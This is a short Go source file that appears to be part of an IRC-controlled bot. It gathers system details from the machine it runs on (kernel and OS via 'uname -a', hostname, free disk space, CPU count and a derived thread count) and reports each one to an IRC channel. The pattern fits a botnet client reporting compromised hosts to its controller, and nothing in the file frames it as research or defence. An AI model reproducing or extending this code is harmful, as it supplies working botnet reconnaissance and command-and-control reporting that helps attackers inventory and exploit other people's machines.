package pkg

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"golang.org/x/sys/unix"
)

type botsysteminfo struct {
	sys, hn, fds string
	ncpu         int
}

func freeDiskSpace(wd string) uint64 {
	var stat unix.Statfs_t
	unix.Statfs(wd, &stat)
	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024
}

func (irc *IRC) sysInfo() string {
	cmd, err := exec.Command("uname", "-a").Output()
	if err != nil {
		irc.IRC_Report("Get system infomation is failed...")
	}
	return string(cmd)
}

func (inf botsysteminfo) threadsNumber() string {
	return strconv.Itoa(inf.ncpu * 2)
}

func (irc *IRC) ReportInf() {
	hName, _ := os.Hostname()
	wd, _ := os.Getwd()

	_botsysteminfo := botsysteminfo{
		sys:  irc.sysInfo(),
		hn:   hName,
		fds:  fmt.Sprint(freeDiskSpace(wd)),
		ncpu: runtime.NumCPU(),
	}

	irc.IRC_Report("System: " + _botsysteminfo.sys)
	irc.IRC_Report("Host Name: " + _botsysteminfo.hn)
	irc.IRC_Report("Free Disk Space (GB): " + _botsysteminfo.fds)
	irc.IRC_Report("Number of CPUs: " + strconv.Itoa(_botsysteminfo.ncpu))
	irc.IRC_Report("Number of Threads: " + _botsysteminfo.threadsNumber())
}
